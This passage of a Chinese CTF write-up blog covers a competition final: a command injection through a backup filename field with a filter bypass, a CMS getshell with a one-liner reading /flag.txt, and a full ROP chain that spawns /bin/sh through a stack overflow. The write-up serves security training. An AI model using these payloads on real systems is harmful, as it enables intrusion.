<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fileName</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$hasDangerFileName</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'msg'</span> <span class="token operator">=></span> <span class="token class-name static-context">Ibos</span><span class="token operator">::</span><span class="token function">lang</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Database export filename invalid'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dashboard.default'</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样ban的话写马太困难，但是依旧可以直接执行命令</p>
<p>构造payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">backuptype<span class="token operator">=</span>all<span class="token operator">&amp;</span>custom_enabled<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>shell<span class="token operator">&amp;</span>sizelimit<span class="token operator">=</span><span class="token number">2048</span><span class="token operator">&amp;</span>extendins<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>sqlcompat<span class="token operator">=</span><span class="token constant">MYSQL41</span><span class="token operator">&amp;</span>sqlcharset<span class="token operator">=</span>utf8<span class="token operator">&amp;</span>usehex<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>usezip<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span><span class="token number">2021</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>llss<span class="token operator">></span><span class="token number">111</span><span class="token operator">%</span><span class="token number">262021</span><span class="token operator">&amp;</span>dbSubmit<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109114700372.png" alt="image-20250109114700372"></p>
<p>web根目录下访问可以带出回显内容</p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109140751067.png" alt="image-20250109140751067"></p>
<p>改成 <code>cacatt f12g.txt</code> 就能读取flag了</p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109141001775.png" alt="image-20250109141001775"></p>
<p>怎么 f12g.txt 就在web目录，这下知道前几血怎么做的了</p>
<hr>
<h2 id="web-国产业务系统隐患排查"><a href="#web-国产业务系统隐患排查" class="headerlink" title="web-国产业务系统隐患排查"></a>web-国产业务系统隐患排查</h2><p>流量包分析出后台密码</p>
<p>然后是一个蝉知7.7，getshell的方式在 <a href="(/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#GKCTF-2021-easycms)">NSS GKCTF2021 easycms</a> 中亦有记载</p>
<p>简单提个权拿flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2.7 <span class="token parameter variable">-c</span> <span class="token string">'print(open(\"/flag.txt\").read())'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109112822712.png" alt="image-20250109112822712"></p>
<hr>
<h2 id="pwn-snake"><a href="#pwn-snake" class="headerlink" title="pwn-snake"></a>pwn-snake</h2><p>dword_6BD3F0 是分数</p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110114712153.png" alt="image-20250110114712153"></p>
<p>打2分输入q退出后进入 sub_401427</p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110114648914.png" alt="image-20250110114648914"></p>
<p>v1接收输入，那么这里v3存在栈溢出，偏移0x70+0x8</p>
<p>sub_40117D 是base64解码</p>
<p>于是用 ROPgadget 生成payload打栈溢出，加上偏移量后base64编码payload</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> pwn <span class="token parameter variable">--ropchain</span> <span class="token operator">></span> exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最终payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack

<span class="token comment"># Padding goes here</span>
p <span class="token operator">=</span> <span class="token string">b''</span>

p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004005af</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000480bb1</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004458a0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000480bb1</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004006a6</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044cb86</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004458a0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401dac</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>手动玩贪吃蛇到2分后，q退出跳转到后门函数，打入payload即可</p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110115102546.png" alt="image-20250110115102546"></p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>